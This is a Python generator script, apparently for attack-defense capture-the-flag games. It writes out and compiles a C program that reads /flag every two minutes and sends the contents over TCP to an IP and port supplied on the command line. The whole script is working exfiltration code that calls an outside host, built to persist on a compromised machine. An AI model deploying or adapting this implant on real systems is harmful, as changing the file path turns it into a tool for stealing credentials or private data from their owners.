import sys
import time
import os
def main():  
    # 检查是否提供了足够的命令行参数  
    if len(sys.argv) != 3:  
        print("Usage: python script.py <listen_ip> <listen_port>")  
        sys.exit(1)  
    # 从命令行获取参string1 = sys.argv[1]
    listen_ip = sys.argv[1]
    listen_port = sys.argv[2]
    output_file = "CTF_capture.c"
    # 拼接字符串
    string1 = """#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
#include <unistd.h>  
#include <arpa/inet.h>  
#include <sys/types.h>  
#include <sys/socket.h>  
#include <time.h>  
  
#define SERVER_IP \""""
    string2 = """\"
#define SERVER_PORT """
    string3 = """
#define BUFFER_SIZE 1024  
#define FLAG_FILE "/flag"  
  
void send_file_content(const char *server_ip, int server_port, const char *file_path) {  
    int sockfd;  
    struct sockaddr_in server_addr;  
    FILE *file;  
    char buffer[BUFFER_SIZE];  
    char file_content[BUFFER_SIZE * 10] = {0};  // 假设文件内容不会超过10KB  
    size_t content_length = 0;  
  
    // 创建套接字  
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {  
        perror("socket creation failed");  
        exit(EXIT_FAILURE);  
    }  
  
    // 设置服务器地址和端口  
    memset(&server_addr, 0, sizeof(server_addr));  
    server_addr.sin_family = AF_INET;  
    server_addr.sin_port = htons(server_port);  
    if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {  
        perror("Invalid address/ Address not supported");  
        close(sockfd);  
        exit(EXIT_FAILURE);  
    }  
  
    // 连接到服务器  
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {  
        perror("Connection Failed");  
        close(sockfd);  
        exit(EXIT_FAILURE);  
    }  
  
    // 读取文件内容  
    file = fopen(file_path, "r");  
    if (file == NULL) {  
        perror("Failed to open file");  
        close(sockfd);  
        exit(EXIT_FAILURE);  
    }  
  
    while (fgets(buffer, BUFFER_SIZE, file) != NULL) {  
        strncat(file_content, buffer, BUFFER_SIZE * 10 - content_length - 1);  
        content_length = strlen(file_content);  
    }  
  
    fclose(file);  
  
    // 发送文件内容到服务器  
    if (send(sockfd, file_content, content_length, 0) < 0) {  
        perror("Send failed");  
        close(sockfd);  
        exit(EXIT_FAILURE);  
    }  
  
    printf("File content sent successfully");  
  
    // 关闭套接字  
    close(sockfd);  
}  
  
int main() {  
    while (1) {
        send_file_content(SERVER_IP, SERVER_PORT, FLAG_FILE);  
        sleep(120);  // 每两分钟执行一次  
    }  
  
    return 0;  
}
"""
    combined_string = string1 + listen_ip + string2 + listen_port + string3  # 或者使用 f-string: combined_string = f"{string1}{string2}"  
      
    # 写入文件  
    with open(output_file, 'w') as file:  
        file.write(combined_string)  
    
    print(f"The combined string '{combined_string}' has been written to {output_file}")  
    os.system("gcc CTF_capture.c -o "+str(time.time()))
if __name__ == "__main__":  
    main()
